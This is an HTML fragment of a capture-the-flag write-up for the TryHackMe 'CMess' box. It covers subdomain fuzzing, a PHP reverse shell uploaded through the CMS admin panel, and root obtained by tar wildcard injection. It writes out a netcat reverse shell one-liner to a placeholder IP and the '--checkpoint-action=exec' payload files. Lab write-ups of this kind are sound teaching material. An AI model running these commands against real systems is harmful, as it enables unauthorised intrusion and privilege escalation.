                    <p>Obviously, by looking at the scan we can see that this is going to be some web-related stuff,
                        since <span class="highlight">port 80</span> is open which is the <span

                    <p>Before navigating to the website, the challenge page says to add <span

                            cmess.thm</span> to the <span class="highlight">/etc/hosts</span> file, so let's do that.
                        After opening it with the <span class="highlight">nano</span> text editor and addig the required
                        line, we can finally reach the page.</p>

                    <p>Looking at these two, the <span class="highlight">XSS</span> is highly unlikely to have any use,
                        since it's a virtual machine
                        with no users to attack (There has been boxes where the answer was indeed XSS since a bot
                        visited the malicious link from time to time, but besides noting it down we didn't give it high
                        priority, first we'll check the more interesting stuff)</p>
                </li>
                <li>
                    <p>The <span class="highlight">LFI</span> is more interesting, but after checking out the exploit we
                        immediately realised that it's
                        authenticated, so it will also be no use for us, atleast for now, till we have a user.</p>
                </li>
                <li>
                    <p>
                        Next thing we did, is to run <span class="highlight">Dirbuster</span> against the site, with
                        basic config, using the wordlist (don't forget to turn recursive mode off or your scan will run
                        forever): <br><br>
                        <span class="highlight">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                        </span>
                    </p>
                </li>
                <li>
                    <p>
                        This gave us tons of results, we did waste some time navigating to these, but afterall none of
                        them appeared to be interesting.
                    </p>
                </li>
                <div class='my-5 hline'></div>
                <li>
                    <p>
                        We did get stuck a bit here, but after some thinking we decided to run <span
                            class="highlight">wfuzz</span> against the site, to check for subdomains. There are other
                        ways to discover subdomains, but I personally love <span class="highlight">wfuzz</span> for how
                        insanely fast it is. We used this command:
                    </p>
                </li>
                <li>
                    <span class="code">wfuzz -c -f subdomains.txt -w
                        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H
                        "Host: FUZZ.cmess.thm" --hl 107
                    </span>
                </li>
                <li>
                    <p>
                        This almost instantly gave us a result which looked interesting: <span
                            class="highlight">dev.cmess.thm</span>. We added this to /etc/hosts too, then navigated to
                        the site and boom! We found some chat-looking thing with some credentials in it!
                    </p>
                </li>

                <li>
                    <img class="img-fluid" style="height: 500px; width: 1370px;"

                <li>
                    <p class="my-3">
                        Yay we got credentials! We did try to ssh in with these, even though we saw that these are the
                        credentials for the website admin panel, but gotta go for the low hanging fruits :) <br> SSH did
                        not
                        work with this password, so we went and opened the admin panel, which is at: <span
                            class="highlight"><a class="body-link" href="cmess.thm/admin">cmess.thm/admin</a></span>
                    </p>

                <li>
                    <img class="img-fluid" style="height: 500px; width: 1370px;"

                    <p class="my-3">
                        This wasn't a rabbithole, and we managed to finally log in. When you are in an admind panel, you
                        should usually look for ways to upload a shell that the webserver can execute. We indeed did
                        this and found a way really quick.
                    </p>
                </li>
                <p>
                    You can upload a file via navigatin to the <span class="highlight">left side</span> of the admin
                    panel, hovering over <span class="highlight">Content</span> and then clicking <span
                        class="highlight">File Manager</span>.
                </p>
                <p>There is no restriction for <span class="highlight">php</span> files, so we simply uploaded the basic
                    reverse shell found in <span class="highlight">/usr/share/webshells/php</span>, the one from <br>
                    <span class="highlight">pentest monkey</span>. Don't forget to open a listener with</p>
                <span class="code">nc -lvnp &lt;PORT&gt;</span>
                <p>After all this, we had to find where the file was uploaded, but this also didn't take long since the
                    file system is quite simple, we just navigated through it by hand and found that it was in the <span
                        class="highlight">assets</span> folder. All we had to do is to open the reverse shell in the
                    browser, so it executes on the webserver, and we did indeed get our foothold on the server, by
                    reciving our first shell as <span class="highlight">www-data</span>.</p>
                <div class='my-5 hline'></div>
                <p>What I usually do after managing to get a shell, especially as <span
                        class="highlight">www-data</span>, is to check the files in the
                    website folder, since www-data will have permission to read these. This did take us into a small
                    rabbithole, but I'll include it in the writeup, since it could have been the right way for <span
                        class="highlight">priv-esc</span>
                    if it was a real-life situation.</p>
                <p>
                    So the rabbithole: in <span class="highlight">/var/www/html</span> there is a <span
                        class="highlight">config.php</span> with some <span class="highlight">MySQL</span> root user
                    credentials in it. This immediately looked really interesting, maybe there is some info in the
                    database that will help us priv-esc somehow, so we logged into it with root:
                </p>
                <span class="code">mysql -u root -p</span>
                <p>After this, mysql will ask for a password, and after giving the one found in the php file we managed
                    to log in as root. We encountered a problem here, our shell wasn't able to handle the communication
                    with the mysql server for some reason. Let's get a better shell first, then try again. Python3 is
                    installed on the machine, so we can get a nice shell easily by running these:
                </p>
                <span class="code">python3 -c "import pty;pty.spawn('/bin/bash')"<br>
                    Ctrl+Z <br>
                    stty raw -echo <br>
                    fg <br>
                    [enter] <br>
                    [enter] <br>
                    export TERM=screen
                </span>
                <p>Now we got a shell that can handle the <span class="highlight">MySQL</span> prompt and we can also
                    <span class="highlight">clear</span> it or move around with the
                    arrow keys, so it's much better. Let's log in to <span class="highlight">MySQL</span> as <span
                        class="highlight">root</span> again,
                    the same way as before.</p>
                <p>We managed to log in and we can finally see the mysql prompt at the start of the line. Let's run some
                    SQL commands:</p>
                <span class="code">show databases;</span>
                <p>This returned:</p>
                <pre class="code">

+--------------------+ 

5 rows in set (0.00 sec)</pre>
                <p>Obviously the interesting database here is the one named <span class="highlight">gila</span>, so the
                    next
                    thing we did was selecting that database for use:</p>
                <span class="code">use gila;</span>
                <p>After this, we wanted to see which tables this database contains, so let's run:</p>
                <span class="code">show tables;</span>
                <p>This gave us:</p>
                <pre class="code">

                <p>After checking each table out, we've managed to find that the one named <span
                        class="highlight">user</span> contained interesting stuff. If someone's not familiar to SQL,
                    here's the command we used:</p>
                <span class="code">SELECT * FROM user;</span>
                <p>We got:</p>

                <p>And this is where we realised that we are deep in a rabbithole :D</p>
                <p>The way we found that out was by trying to crack the password hash we got from the database (we
                    already suspected that this is gonna be the same as the pass we got from the dev subdoamin, since
                    it's in the gila database), and when we cracked it we indeed found that it's the pass we already
                    had.</p>
                <div class='my-4 hline'></div>
                <p>When you get in a rabbithole, best is to take a step back and try a different approach, you'll always
                    have your previous findings to pick up and go back to later if you documented everything well. This
                    is exactky what we did, so we started to look around the file system a bit more.</p>
                <p>We first found an interesting file in the <span class="highlight">/tmp</span> folder, but this
                    appeared to be useful for getting root later.</p>
                <p>Since manual looking didn't give us anything, we decided to run <span
                        class="highlight">linenum</span>on the target.</p>
                <p>This gave us a very interestign result, a password backup file located in the <span
                        class="highlight">/opt</span> folder, called <span class="highlight">.password.bak</span></p>
                <p>We've managed to use this to get from <span class="highlight">www-data</span> into a higher user,
                    using the credentials (both login name and password) in the backup file. The simple linux command to
                    use is:</p>
                <span class="code">su -l &lt;redacted user&gt;</span>
                <p>Then giving the password. We finally got a better user, and we have the right to <span
                        class="highlight">cat</span> out the <span class="highlight">user.txt</span> file found
                    in the user's home folder.</p>
                <div class='my-4 hline'></div>
                <p>Next thing was to get root. We saw an interesting folder in the user's home folder other than the
                    flag,
                    called <span class="highlight">backup</span>. In there there is a file called <span
                        class="highlight">note</span> which has this in it:</p>
                <span class="code">Note to self. Anything in here will be backed up!
                </span>
                <p>Okay, so from this we know that there's a backup service running on the server, we can also see this
                    from the <span class="highlight">linenum</span> report, and we also found the backed up file in the
                    <span class="highlight">/tmp</span> folder earlier when we were looking for user priv-esc. We can in
                    fact see the exact command that is being run when the backup happens (also from linenum, or catting
                    the cronjob files):</p>
                <span class="code">*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *</span>
                <p>Not sure how many people are familiar with it, but there's a way to exploit <span
                        class="highlight">tar</span> if it uses <span class="highlight">wildcards</span>, there is more
                    info on it <a class="body-link"
                        href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">in
                        this article</a>.</p>
                <p>The name of the attack is <span class="highlight">Wildcard injection</span>, and it's a way to make
                    <span class="highlight">tar</span> run an executable for us. Since the backup service is running as
                    root, if we make this executable a reverse shell, then we got ourselves a root shell.</p>
                <p>First we confirmed that <span class="highlight">netcat</span> is installed on the webserver, then
                    made a <span class="highlight">netcat reverse shell</span> with <span
                        class="highlight">msfvenom</span>:</p>
                <span class="code">msfvenom -p cmd/unix/reverse_netcat lhost=&lt;IP&gt; lport=&lt;PORT&gt; R</span>
                <p>Let's make sure we are in the <span class="highlight">backup</span> folder and run the thing <span
                        class="highlight">msfvenom</span>
                    gave us:</p>
                <span class="code">mkfifo /tmp/pdbd; nc &lt;IP&gt; &lt;PORT&gt; 0/tmp/pdbd 2>&1; rm /tmp/pdbd echo
                    "mkfifo
                    /tmp/lhennp; nc &lt;IP&gt; &lt;PORT&gt; 0/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh</span>
                <p>Two more things we have to run for the <span class="highlight">wildcard injection</span> to happen,
                    but first don't forget to open a netcat listener on your attacking machine, so the rev shell can
                    connect back to something.</p>
                <span class="code">nc -lvnp &lt;PORT&gt;</span>
                <p>And now we run the last two steps for the attack to be successful:</p>
                <span class="code">echo "" > "--checkpoint-action=exec=sh shell.sh"</span>
                <span class="code">echo "" > "--checkpoint=1"</span>
                <p>This will make <span class="highlight">tar</span> execute our reverse shell, and after waiting a bit,
                    we successfully <span class="highlight">rooted the box!</span></p>
                <div class='my-4 hline'></div>
                <p>Overall I think it was a fun box, with interestign steps involved during exploitation. I'd like to
                    thank <a class="body-link" href="https://tryhackme.com/p/Optional">Optional</a> for creating it :)</p>
